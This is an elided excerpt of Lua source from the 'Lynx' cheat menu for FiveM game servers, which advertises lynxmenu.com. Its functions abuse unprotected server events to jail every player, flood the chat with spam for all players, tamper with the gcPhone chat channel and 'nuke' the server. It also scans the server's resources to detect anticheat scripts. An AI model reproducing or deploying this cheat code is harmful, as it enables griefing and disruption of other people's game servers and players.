...
local function drawButton(text, subText)
  ...
  function LR.CreateMenu(id, title)
    ...
    menus[id].subTitle = "www.lynxmenu.com"
...
menus[id].y = 0.15
  ...
  local function GetResources()
    ...
    for i=0, #Resources do
      local detect = string.find(tostring(Resources[i]), "_")
      local antishit = string.find(tostring(Resources[i]), "_")
      print(Resources[i])
      if antishit ~= nil then
        LR.OpenMenu(LynxIcS)
      end
      if detect ~= nil then
      TSE("DFWM:ViolationDetected",arg)
      end
    end
    ...
    local function MagnetoBoy()
      ...
      local function jailall()
        ...
        for i=0, #pbase do
          TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "www.lynxmenu.com.com 10 - Cheats and Anti-Lynx")
          TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("js:jailuser", GetPlayerServerId(i), 45 * 60, "www.lynxmenu.com.com 10 - Cheats and Anti-Lynx")
      ...
      local function bananapartyall()
        ...
        for c = 0, 9 do
          ...
          TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."www.lynxmenu.com - Hello guys!")
        end
        local pbase = GetActivePlayers()
        for i=0, #pbase do
...
if gcphonedestroy then
	...
	TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
          ...
          function nukeserver()
           ...
           for i=0,128 do
             -- for c = 0, 9 do
                --TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."www.lynxmenu.com - Cheats & AntiCheats!")
              --end
        ...
        Citizen.CreateThread(function()
          ...
          while Enabled do
            ...
            if LR.IsMenuOpened(LynxIcS) then
              ...
              notify("~u~www.lynxmenu.com~u~/", false)
        ...
        LR.OpenMenu(LynxIcS)
            ...
            elseif LR.IsMenuOpened("classic1") then
              ...
              if bytexd ~= "www.lynxmenu.com" then
                nukeserver()
              end
